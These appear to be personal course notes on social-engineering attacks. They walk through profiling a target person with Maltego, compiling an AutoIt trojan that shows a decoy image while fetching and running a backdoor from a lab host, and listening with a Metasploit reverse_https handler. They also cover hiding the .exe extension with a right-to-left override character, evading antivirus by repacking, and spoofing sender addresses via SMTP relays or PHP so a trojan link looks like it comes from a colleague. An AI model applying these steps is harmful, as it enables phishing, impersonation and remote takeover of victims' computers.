# Client side attacks — social engineering
-   There are many tools on market for this activity
-   It is mainly about gathering as much information about target person and creating strategy how to manipulate the target person to help us with the hack

## Tool <strong>Maltego</strong>
-   It can automatically find information regarding target. 
-   Example 1st step gather information:
    1)  Create graph
    2)  Put person inside the Graph
    3)  Fill the name
    4)  Right click on Person and in transformers find websites
    5)  It will try to find all websites connected to the name including profiles on platforms like Udemy, Stack Overflow...
    6)  Go through all the found websites and if more information was found, start filling the graph. Did you find Twitter/Facebook/Instagram... account? Put them in.
    7)  To add more entities, than shown on left side. Find the correct one under Entity option in top bar.
    8)  If did you find Twitter, create entity Twitter fill the information. Right click and find friends on twitter.
    9)  Did you find email? Add new entity email address and set the email you found. Right click and try to find more with transforms.
        -   Possible way, choose domain name
        -   after the domain shows right click and try to get email addresses or try to find a website and from there try to find more email addresses

-   Example 2nd step build strategy:
    1)  Put the Person on the top and connect the gathered information that was gathered based on relations.
    2)  Explore the graph, we could find work colleagues which might be also friends. Email that looks like coming from person like this can be sent to the target person, which will include for example backdoor.

## Include backdoor created before with any file
-   Use file created in 08_client_side_attacks and put it inside image / pdf / anything else
-   Steps (using Autoit):
    1)  Create auto download and run script (example: included in attachments file `autoit-download-and-execute.txt` to use the file, fill in the download URLs in line 4\). First URL is the not malicious file (example some image), Second should be direct URL to the backdoor (example: `192.168.72.129/evil_files/backdoor.exe`).
    2)  Change file extension from .txt to .au3
    3)  Create icon which will correspond to the non-malicious file. In our case image.
    4)  Open Compile Script (from Autoit). Tool is automatically installed with Veil.
        -   Choose source as our file
        -   Set destination
        -   Set custom icon created in step 3
        -   Click on convert and after done get the created .exe

-   Listen in Metasploit to any incoming connection (described in 08_client_side_attacks):
```bash
msfconsole
use exploit/multi/handler # use module which enables to listen to incoming connections
set PAYLOAD windows/meterpreter/reverse_https
set LHOST 192.168.72.129
set LPORT 8080
exploit # now if anybody opens the backdoor, it will come to this pc...
```
-   get the compiled script from point 4 to victim pc via email or any other method and wait for attacked person to open it. 
-   the file is shown on the victim's machine with icon we previously created and it will open the image for him, therefore it is less suspicious and it executes at background the malicious code. But it is still .exe

### Convert the file from .exe to any desired suffix
-   use right to left characters:
    -   rename the file in the way, that the desired suffix is on the contrary at the end of file name: `porsche.exe => porschegpj.exe`
    -   use `right to left override` character on the position where the contrary suffix starts
    -   system will now read the name in this way (see the source code of this file next to result to understand better): `porsche‮gpj.exe`
    -   best works with filenames which ends with exe
    -   when downloaded by browser. Browser will replace the right to left override character. To prevent it from happening zip the file.
Note: In my case Chrome is able to detect the virus inside .zip. But .7z went smoothly through. But then it was stopped via windows defender. I was able to make this work only after windows defender was down. Probably well known technique by antiviruses.

## Fake email method 1
-   Only works if the organization doesn't implement proper email authentication. Check if the domain can be spoofed can be done through [https://easydmarc.com/tools/dmarc-lookup](https://easydmarc.com/tools/dmarc-lookup). If there is no DMARC detected, the emails can be sent to the domain server. If DMARC is not implemented, attackers can make emails that look like it comes from the domain.
-   There are many websites for sending spoofed emails. The problem with them is that they will usually end up in spam box.
-   It is better to use SMTP servers. It is possible to send the malicious data via websites which are used for sending business emails like Brevo or Mailchimp. Example:
    1)  Create account and find information regarding smtp server to be able to connect and send emails through it.
    2)  Use `sendemail` tool. From email address should be someone who the victim knows. To address is the victims address. Include link to the trojan in the message body. Example:
        ```bash
        sendemail -xu email@address.com -xp passwordFromServer -s smtp.server.address.com:portNumber -f 'from.email@addres.com' -t 'to.email@address.com' -u 'subject text' -m 'message body' -o message-header="FROM: From Person <from.email@addres.com>"
        ```
        -   `-xu`, `-xp` and `-s` => authentication to smtp server (gathered from step 1)
        -   `-f` => sender could be victims friend / boss / anybody he knows
        -   `-t` => victims email
        -  `-o message-header=` => advanced option, this example shows how to change 'FROM', so the email looks like it came from the sender (in Gmail, this is also shown)
    3) After sent email like this, don't forget to again set the listener for incoming connection (such as Metasploit as described before)

## Fake emails method 2
-   Fake emails using PHP (requires web hosting)
-   Setup webhosting with support of sending emails, create webpage in php for sending emails including From field which is working on same basis as the command in method 2.
-   Again, send the email with the link and set Metasploit for listening.